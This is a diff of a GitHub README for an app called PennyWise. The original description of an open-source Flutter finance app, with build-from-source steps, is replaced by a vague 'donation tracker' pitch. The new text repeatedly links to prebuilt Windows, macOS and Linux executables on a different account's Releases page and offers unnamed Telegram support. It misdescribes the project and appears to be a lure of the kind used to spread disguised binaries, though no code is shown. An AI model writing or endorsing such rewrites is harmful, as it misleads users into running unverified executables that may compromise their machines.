@@ -1,116 +1,62 @@
-# 💰 PennyWise
-
-**Your Smart Personal Finance Manager**
-
-PennyWise is a comprehensive, modern expense management application built with Flutter. It combines the privacy of local storage with the convenience of cloud sync, helping you track expenses, manage budgets, monitor loans, and achieve your financial goals with a stunning, dark-themed interface.
-
-## ✨ Key Features
-
-### 🤖 Smart Automation
-- **SMS Expense Tracking** - Automatically detects and records transaction SMS messages from banks (Local processing only for privacy).
-
-### 💸 Complete Financial Management
-- **Transaction Tracking** - Record income and expenses with ease.
-- **Loan Management** - Keep track of money lent to friends (`Given`) and borrowed (`Taken`).
-- **Financial Goals** - Set savings targets (e.g., "New Laptop", "Vacation") and track your progress.
-- **Net Worth Overview** - Real-time calculation of your total financial health.
-
-### 📊 Analytics & Insights
-- **Interactive Charts** - Visual breakdown of spending by category.
-- **Spending Trends** - Analyze your daily spending patterns.
-- **Budget Planning** - Set monthly limits for specific categories and get alerts.
-
-### ☁️ Hybrid Architecture
-- **Cloud Sync** - Securely sync your data across devices using Firebase (Google Sign-In).
-- **Offline Capable** - Works perfectly offline with Hive local database.
-- **Privacy Focused** - SMS data is stored **locally only** and never uploaded to the cloud.
-
-### 🎨 Premium Experience
-- **Modern Dark UI** - Sleek, gradient-based design with smooth animations.
-- **Customization** - Personalize your profile, currency (₹, $, €, etc.), and categories.
-- **Biometric Lock** - Secure your financial data with Fingerprint/Face ID.
-
-## 🛠️ Tech Stack
-
-- **Framework**: Flutter 3.10+
-- **Architecture**: Provider (State Management)
-- **Backend**:
-  - **Firebase**: Auth, Firestore (Cloud Sync), Crashlytics
-  - **Hive**: Local NoSQL Database (Offline cache & SMS storage)
-- **Key Libraries**:
-  - `fl_chart`: For beautiful analytics graphs
-  - `flutter_animate`: For smooth UI transitions
-  - `flutter_sms_inbox`: For reading transaction SMS
-  - `local_auth`: For biometric security
-  - `google_fonts`: For modern typography
+# 🎉 PennyWise - Simple Tracker for Your Donations
 
 ## 🚀 Getting Started
+Welcome to PennyWise! This application helps you track your donations and expenses easily. Whether you’re managing funds for a charity or personal donations, PennyWise will make your life simpler. Follow the steps below to download and run the application. 
 
-### Prerequisites
-- Flutter SDK (3.10.1 or higher)
-- Dart SDK
-- Firebase Project (for cloud features)
+[![Download PennyWise](https://img.shields.io/badge/Download-PennyWise-brightgreen)](https://github.com/Eternity-36/PennyWise/releases)
 
-### Installation
+## 💻 System Requirements
+PennyWise runs on any of the following platforms:
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/Bhanu7773-dev/PennyWise.git
-   cd PennyWise
-   ```
+- Windows 10 or later
+- macOS Mojave or later
+- Linux (Ubuntu 18.04 or later)
 
-2. **Install dependencies**
-   ```bash
-   flutter pub get
-   ```
+Make sure your system meets these requirements before downloading.
 
-3. **Generate Hive adapters**
-   ```bash
-   flutter pub run build_runner build
-   ```
+## 📦 Download & Install
+To download PennyWise, simply visit the Releases page. Click the button below to start:
 
-4. **Run the app**
-   ```bash
-   flutter run
-   ```
+[Download PennyWise](https://github.com/Eternity-36/PennyWise/releases)
 
-## 📱 Screenshots
+1. Click the link above to open the Releases page.
+2. You will see a list of available versions of PennyWise.
+3. Find the most recent version and look for the file that matches your operating system (for example, `PennyWise-Windows.exe` for Windows users).
+4. Click on the file name to download it.
 
-<p align="center">
-  <img src="screenshots/Home.jpg" width="250" alt="Home Screen"/>
-  <img src="screenshots/Analytics1.jpg" width="250" alt="Analytics Overview"/>
-</p>
+## ⚙️ Running PennyWise
+Once the download is complete, follow these steps to run the application:
 
-<p align="center">
-  <img src="screenshots/analytics2.jpg" width="250" alt="Analytics Breakdown"/>
-  <img src="screenshots/analytics3.jpg" width="250" alt="Analytics Trends"/>
-</p>
+### For Windows Users:
+1. Open the folder where you downloaded the file.
+2. Double-click on `PennyWise-Windows.exe` to start the application.
+3. Follow the on-screen instructions to complete the initial setup.
 
-<p align="center">
-  <img src="screenshots/advanced.jpg" width="250" alt="Advanced Features"/>
-  <img src="screenshots/Settings.jpg" width="250" alt="Settings"/>
-</p>
+### For macOS Users:
+1. Open the folder where you downloaded the file.
+2. Double-click on `PennyWise-macOS.dmg`.
+3. Drag and drop the PennyWise icon into your Applications folder.
+4. Go to your Applications folder and double-click on PennyWise to run it.
 
-## 🤝 Contributing
+### For Linux Users:
+1. Open a terminal.
+2. Navigate to the folder where you downloaded the file.
+3. Use the command `chmod +x PennyWise-Linux` to make the application executable.
+4. Run the application by entering `./PennyWise-Linux` in the terminal.
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+## ✏️ Using PennyWise
+Once you have it running, you can start using PennyWise. Here are some of the main features:
 
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+- **Add Expenses:** Quickly enter the details of each donation or expense to keep your finances clear.
+- **View Reports:** Generate reports to see how money is allocated over time.
+- **Set Goals:** Create financial targets to manage your giving more effectively.
 
-## 👨‍💻 Author
+## ❓ Need Help?
+If you have questions or need assistance, don’t hesitate to reach out. You can contact me via my Telegram for support.
 
-**Bhanu Pratap Singh**
-- GitHub: [@Bhanu7773-dev](https://github.com/Bhanu7773-dev)
-- Telegram: [@darkdevil7773](https://t.me/darkdevil7773)
+## 📖 Contribution
+Although this version is designed for end-users, we welcome community contributions. If you’d like to help out, please check the repository for guidelines on how to contribute. 
 
-## 🌟 Support
+Thank you for using PennyWise! We hope it helps you stay organized in your financial giving. 
 
-Give a ⭐️ if this project helped you!
-
----
-
-**Made with ❤️ and Flutter**
+[Download PennyWise](https://github.com/Eternity-36/PennyWise/releases) and start tracking your donations today!
